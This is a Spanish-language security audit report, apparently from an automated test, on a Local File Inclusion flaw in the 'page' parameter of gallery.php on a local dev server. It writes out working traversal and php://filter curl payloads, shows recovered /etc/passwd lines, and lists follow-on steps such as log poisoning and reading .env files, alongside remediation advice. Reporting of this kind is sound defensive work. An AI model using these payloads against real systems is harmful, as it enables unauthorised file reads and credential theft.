# Informe de auditoría LFI — Galería de Arte Virtual

Fecha: 2026-04-27T16:05:32Z
Objetivo: http://web.dev.local:8081

Resumen ejecutivo
-----------------
Objetivo analizado: http://web.dev.local:8081
Parámetro dinámico evaluado: gallery.php?page

Hallazgos clave:
- Se identificó una vulnerabilidad de Local File Inclusion (LFI) en el parámetro "page" de gallery.php.
- Se pudo leer el archivo /etc/passwd del sistema objetivo utilizando traversal simple y también con php://filter.

Estado:
- VULN_FOUND: true
- VULN_EXPLOITED: true

Pruebas y metodología
---------------------
1) Reconocimiento inicial
- Se obtuvo la página principal con:
  curl -sS -i http://web.dev.local:8081
- Observaciones: la página contiene enlaces como gallery.php?page=modern que indican inclusión dinámica de archivos PHP.

2) Fuzzing y prueba de traversal
- Intento directo de traversal:
  curl -sS -m 10 "http://web.dev.local:8081/gallery.php?page=../../../../../../etc/passwd" -i
  Resultado: la respuesta mostró el contenido de /etc/passwd insertado en el cuerpo HTML.

3) Uso de wrappers php://filter para evadir filtros y leer contenido codificado
- Payload usado para intentar leer ficheros mediante base64:
  curl -sS -m 10 "http://web.dev.local:8081/gallery.php?page=php://filter/read=convert.base64-encode/resource=/etc/passwd" -i
  Resultado: la respuesta contenía base64 del /etc/passwd dentro del HTML. Decodificando la sección base64 se recuperó el contenido del fichero.

Evidencias (extractos)
-----------------------
- Contenido recuperado de /etc/passwd (extracto):
  root:x:0:0:root:/root:/bin/bash
  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
  www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin

- Resumen de comandos exactos ejecutados:
  curl -sS -i http://web.dev.local:8081
  curl -sS -m 10 "http://web.dev.local:8081/gallery.php?page=../../../../../../etc/passwd" -i
  curl -sS -m 10 "http://web.dev.local:8081/gallery.php?page=php://filter/read=convert.base64-encode/resource=/etc/passwd" -i

Impacto
-------
- Acceso a archivos sensibles: lectura de /etc/passwd demostró que LFI permite acceder a ficheros del sistema.
- Riesgos adicionales: con acceso a ficheros web (por ejemplo, config.php, .env, backups) se podrían obtener credenciales, claves o datos de configuración que permitan escalar a RCE o acceso adicional.

Recomendaciones
---------------
1. Validación y sanitización rígida del parámetro "page": permitir únicamente una lista blanca de valores esperados (p.ej. modern, classic, abstract, about) y mapearlos a rutas internas sin aceptar rutas proporcionadas por el usuario.
2. Evitar incluir archivos por entrada de usuario; usar un switch/enum en servidor para seleccionar módulos permitidos.
3. Deshabilitar wrappers peligrosos (o validar su uso) y aplicar open_basedir cuando sea aplicable.
4. Revisar permisos de ficheros sensibles y aislar el código web con mínimos privilegios.
5. Buscar y asegurar copias de seguridad, ficheros .env y archivos de configuración fuera del árbol accesible por la web.

Pasos de explotación potenciales adicionales (no implementados aquí):
- Leer ficheros de configuración (config.php, .env) para obtener credenciales de base de datos y otros secretos.
- Utilizar log poisoning + LFI para lograr RCE si existe vulnerabilidad para incluir archivos que contengan código PHP inyectado.
- Intentar exfiltrar /etc/shadow o claves privadas si están accesibles (alto impacto).

Conclusión
----------
El parámetro gallery.php?page es vulnerable a LFI. Se ha confirmado la capacidad de leer archivos del sistema (ej. /etc/passwd) mediante traversal simple y php://filter, por lo que el riesgo es crítico y requiere mitigación inmediata.

Apéndice: notas del auditor
--------------------------
Herramientas usadas (comandos concretos): curl (incorporado), comprobaciones manuales de payloads de traversal y php://filter.

Fin del informe.
